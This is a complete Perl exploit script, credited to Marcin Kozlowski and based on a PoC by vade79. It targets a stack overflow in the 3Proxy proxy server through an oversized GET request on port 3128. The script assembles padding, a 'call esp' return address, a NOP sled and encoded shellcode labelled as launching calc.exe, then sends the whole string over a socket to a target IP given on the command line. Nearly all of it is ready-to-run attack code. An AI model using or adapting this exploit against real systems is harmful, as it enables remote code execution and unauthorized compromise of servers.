#!/usr/bin/perl
#This module exploits a stack overflow in 3Proxy prior to 0.5.3h, and 0.6b-devel before 20070413. By sending a long host header in HTTP GET request to the default port of # 3128, a remote attacker could overflow a buffer and execute arbitrary code.
#                         
# Marcin Kozlowski based on vade79 PoC
#



#IO::Socket for network connections
use IO::Socket;

#the ip address is our first commandline argument also known as ARGV[0] in Perl
$ip = $ARGV[0];

#our nopsled
$nopsled = "\x90"x36;
$A = "A" x 1064;
$B = "B" x 999;



#execute calc.exe
#
$payload = 

"\x54\x50\x53\x50\x29\xc9\x83\xe9\xde\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x02".
"\xdd\x0e\x4d\x83\xee\xfc\xe2\xf4\xfe\x35\x4a\x4d\x02\xdd\x85\x08\x3e\x56\x72\x48".
"\x7a\xdc\xe1\xc6\x4d\xc5\x85\x12\x22\xdc\xe5\x04\x89\xe9\x85\x4c\xec\xec\xce\xd4".
"\xae\x59\xce\x39\x05\x1c\xc4\x40\x03\x1f\xe5\xb9\x39\x89\x2a\x49\x77\x38\x85\x12".
"\x26\xdc\xe5\x2b\x89\xd1\x45\xc6\x5d\xc1\x0f\xa6\x89\xc1\x85\x4c\xe9\x54\x52\x69".
"\x06\x1e\x3f\x8d\x66\x56\x4e\x7d\x87\x1d\x76\x41\x89\x9d\x02\xc6\x72\xc1\xa3\xc6".
"\x6a\xd5\xe5\x44\x89\x5d\xbe\x4d\x02\xdd\x85\x25\x3e\x82\x3f\xbb\x62\x8b\x87\xb5".
"\x81\x1d\x75\x1d\x6a\xa3\xd6\xaf\x71\xb5\x96\xb3\x88\xd3\x59\xb2\xe5\xbe\x6f\x21".
"\x61\xdd\x0e\x4d";


#our extended instruction pointer which we use to overwrite the remote eip
#remeber to make it little-endian format

$eip = "\x72\x93\xab\x71"; #call esp


#we construct our full attackstring here
$attackstring = "GET /".$A.$eip.$nopsled.$payload." HTTP/1.0\nHost: ".$B."\n\n";


print $attackstring;

#view a message if no ip address is given
if(!$ip)
{

die "You have to provide the target's IP Address..\n";

}

#the remote port to connect to
$port = '3128';

#the connection protocol to use
$protocol = 'tcp';

#create the actual network connection
#and print an error message if it's not possible to create a socket
$socket = IO::Socket::INET->new(PeerAddr=>$ip,
                                PeerPort=>$port,
                                Proto=>$protocol,
                                Timeout=>'1') || die "Could not create socket\n";


#send the payload to the remote computer
print $socket $attackstring;

#close the connection
close($socket);